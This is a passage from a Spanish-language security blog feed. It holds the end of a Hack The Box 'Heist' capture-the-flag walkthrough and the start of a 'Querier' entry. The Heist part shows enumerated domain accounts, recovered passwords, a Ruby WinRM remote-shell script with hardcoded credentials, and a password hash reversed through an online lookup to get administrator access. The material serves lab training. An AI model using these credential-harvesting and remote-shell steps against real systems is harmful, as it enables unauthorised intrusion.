&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Brute forcing SIDs at 10.10.10.149
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; StringBinding ncacn_np:10.10.10.149&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\p&lt;/span&gt;ipe&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;sarpc&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
501: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\G&lt;/span&gt;uest &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
503: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;efaultAccount &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
504: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;DAGUtilityAccount &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
513: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;one &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeGroup&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
1008: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;azard &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
1009: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;upport &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
1012: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;hase &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
1013: SUPPORTDESK&lt;span class=&#34;se&#34;&gt;\J&lt;/span&gt;ason &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SidTypeUser&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;credenciales&#34;&gt;CREDENCIALES&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;hazard:stealth1agent
rout3r:$uperP@ssword
admin:Q4)sJu\Y8qz*A3?d
chase:Q4)sJu\Y8qz*A3?d
jason:
support:
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;chase---user&#34;&gt;CHASE - USER&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://alionder.net/winrm-shell/&#34;&gt;&lt;strong&gt;WinRm&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Dentro de los puertos abiertos que encontramos vemos que winrm (5985) esta abierto, utilizamos las credenciales y usuarios que encontramos para intentar logearnos mediante este puerto.&lt;/p&gt;
&lt;p&gt;Utilizamos un script en ruby con la libreria winrm para poder ejecutar comandos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span class=&#34;nb&#34;&gt;require&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;winrm&amp;#39;&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;WinRM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
  &lt;span class=&#34;ss&#34;&gt;endpoint&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://10.10.10.149:5985/wsman&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
  &lt;span class=&#34;ss&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;chase&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
  &lt;span class=&#34;ss&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Q4)sJu\Y8qz*A3?d&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;ss&#34;&gt;:powershell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;until&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;exit&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;PS &amp;gt; &amp;#34;&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;gets&lt;/span&gt;        
        &lt;span class=&#34;n&#34;&gt;output&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;
            &lt;span class=&#34;no&#34;&gt;STDOUT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;
            &lt;span class=&#34;no&#34;&gt;STDERR&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;end&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;end&lt;/span&gt;    
    &lt;span class=&#34;nb&#34;&gt;puts&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Exiting with code &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;#{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;output&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exitcode&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Podemos ejecutar comandos en la maquina y obtenemos nuestra bandera &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-27%2016.00.49.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
&lt;p&gt;Estando dentro de la maquina buscamos archivos en los cuales pudiesen haber contraseñas, principalmente los archivos que se utilizan en la plataforma/inicio de sesion de la pagina que contiene la maquina. Encontramos que, dentro del archivo &lt;code&gt;login.php&lt;/code&gt; hay una condicion con dos usuarios que pueden logearse: &lt;code&gt;guest y admin&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;login.php&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;session_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;login&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;login_username&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;login_password&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;login_username&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;admin@support.htb&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;hash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;sha256&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;login_password&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;valid&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
		&lt;span class=&#34;nx&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Location: issues.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; 
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
		&lt;span class=&#34;nx&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Location: errorpage.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;guest&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;guest&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;true&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;guest&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;valid&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
		&lt;span class=&#34;nx&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Location: issues.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos la paigna de md5decrypt para verificar si existe esta contraseña dentro de la pagina:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://md5decrypt.net/en/Sha256/#answer&#34;&gt;&lt;strong&gt;md5decrypt&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;admin@support.htb:91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040
admin@support.htb:4dD!5}x/re8]FBuZ
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-27%2016.10.12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Verificamos mediante samba que el usuario es administrator y, si este tiene permisos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-27%2016.11.41.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Confirmamos que es el usuario y contraseña de administrator, utilizamos nuevamente el script para winrm con las credenciales.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-27%2016.14.26.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una shell y nuestra bandera &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/heist/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/heist/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>smbmap</category>
            
          
            
              <category>impacket</category>
            
          
            
              <category>winrm</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>windows</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Querier</title>
        <link>https://sckull.github.io/posts/querier/</link>
        <pubDate>Sat, 22 Jun 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 22 Jun 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/querier/</guid>
        <description>Querier es una maquina de HackTheBox, descubrirmos credenciales en una coneccion de base de datos SQL Server dentro de los macros de Excel (xlsm) lo que nos dio acceso a la base de datos mediante un script de Impacket y que posteriormente nos permitio realizar Out-of-Band para obtener las credenciales, este ultimo nos permitio ejecutar una shell inversa.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/querier/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Querier es una maquina de HackTheBox, descubrirmos credenciales en una coneccion de base de datos SQL Server dentro de los macros de Excel (xlsm) lo que nos dio acceso a la base de datos mediante un script de Impacket y que posteriormente nos permitio realizar Out-of-Band para obtener las credenciales, este ultimo nos permitio ejecutar una shell inversa. Tras ejecutar PowerUp encontramos credenciales las cuales utilizamos en PSexec para obtener privilegios de administrador.&lt;/p&gt;
&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/175&#34;&gt;Querier&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,AAABAAIAEBAAAAAAIADLAwAAJgAAABgYAAAAACAA7gYAAPEDAACJUE5HDQoaCgAAAA1JSERSAAAAEAAAABAIBgAAAB/z/2EAAAOSSURBVHicXdPba5tlHAfw7+95nxyaY9Mc2rWla9quW7vZCt3oqO2CSBGHwqQU9MIL55jILsZggl6VeaM3w4GKdGJBUVTGhttQCjpHjcWuB8qsSenWJukpTdqkzfnwJu/zeCfi53/4EAA25gO7NoUqAKQ/7em3tRvfgao9LzTRKIUkhdEOzPxhJaqO6998PA0AYz7wa1MQ5POBT02hGh7rrW09afhwLlgaTWhGp507YayxQOGEiigglthFp72U7vQavpm+m3l/cGIlOzoKhSBB29c7nY1djjvrMTn0+d06+F4b0LyLcSbu/EFPLBzul5+Tj/dsIlVaVC68mIDHLH5BXIzi4kKWxvugu/hB/7dPtuXod/PealfllHL8tINcHoJeWpGVGlJ7WyinbUgmi3Ip/0h7vW+NN9urN2lk4W1a+6hnMCpp8tbvjTXnBodhtTlYxnUY3We7UA3MoZzNwtA7gJ2FMNIP1gBjXkw9fSCHeyPZEy5+lrcdNVzyz5C5vfm4ELsGxrwOWBoEfv7+B9i0DJZmZuH+O4TTfYOoWm1guyoz5Y+KjBqvrWvRLnNAO/NMg0umnW4q7nDkU0CnYQvNHXXwuDowpC9jLxVFNbwCVnMIewkJZ9VOdlkrIZJDDCTdat5E5SSRoYawv1lBqqhHo7cFpKkw6BnaDjejwj1QDwhqkZDaAZVyJoKUDRyMoZiRiK0CTd0SNk4owIDNUAwmLpHTWRCO5LEfWkY540Ayk0M6SdBUARCIg1NUry+0VCpZzPIinSwH0X0/gP0/A4i88iqCrnqUxr+CGQLz3lasm21oFy4puAqQjHNUqg+2KX9+o7AoZEBH9wWH9/ZvOGTiiM3Nglns8CoMcYsVYY8DPZU0ViwxUbAZFTDFzyLLpS+6XMVcqi4Ly/qeqDa5ERx5CQmnHZZgAG0z0yiajPA3NYDKZRRCacGOGdBuz2ezYfEJAYC81/dl5MB4/uOvWeVCucwbYjsUWN1ECYBeUbDUfwr36j3wzAdlrt6qfXbZzFtMxQkaWXiLjY2BbQTUq60O1X/lDU33UyJKP67uis0aOzJQkNE0HFkJyY7liHB7OY1fMfMWe/nhRly9KiXYv5m23mt0Ng0135j8S55L5JilQ6kCawcgAphdhxVpwrPdutSJI7j16+3Eu8M3Q2mfD5z+3/ngRtcLtceslyDYAKB4QFIDRxT5yqTfn5o4c/3po/92/geBVKjVzmsDiAAAAABJRU5ErkJggolQTkcNChoKAAAADUlIRFIAAAAYAAAAGAgGAAAA4Hc9+AAABrVJREFUeJx9lWmMlVcZx3/n3e5797mXWWCYlSmbbAMIlFRpS1uqFbEKbcMXE7eSptjGL2IwVqlpTRoTwwdtjCxtjIlSYgMiUQMaKAWGJqDDMDADMwMzzMZd567vfbfjhwKppfH/8STP/3/Ok+c5PwEoPCgfwP7NotUiEtzm6+qjCPGQhKQAJDIvJDcUxz0ty/Zh46X+C3frHvASnzqUgJRvz19x5rb+3MMrwq9qQS2ClEghsas+QgFVVVCFAFXg17zy9cHygc64sy/w8mDvXU/xWQE+QHnf8u+HGoOvf3jZqbuVdhlI66zqSJC/naD9iwlmRj2CRoWileHi9QyrWx1Wtet0zNWy5TvVH0Ze7N3/yZB7AfIQKF97t/sNY1ZoVybv8qsjDtVYF19/dhmJgonzyx7ao+Nccg3onEfDlm4unJrm/PVB5rfdYsdGlXhEldVM+cehb/f+4l7IvdvLzfuX7zYaQrsGR2u89r6Gn17PM/VrWDGvg5bhcVpaZ0hZUPBtmLqGvDjAysXz+GrbWhqbH+fN4wZjKUcE68NvVH+3dMfddn/8DGffsi1aY+TwzSlHf/2owVceeYxZpSTTwyGWPRvDdV3qHttIrGbjSElVkQy/9x7J2e3c/qhILFklE8xz8vxJXttqUx9RiuXRzKORV29cUgRwaYJnprKe/tZRj0V1n6errp5Ic4xYZx2TWgNznt5ES9Ch7tZFEoNnaAlLFm7fTiFRR7w1SWbCoFVP0hVfx96/+pzodaIfjgdekD9FEXLf0vWD1cCRA6drDTl7IY8HVtK8IkqyZTZ30Gnb0E0xe4dCZoTxvj4yE+MoTW08uXkbmhHi9ol/U7xcQdOzGKrDwbM9bFo3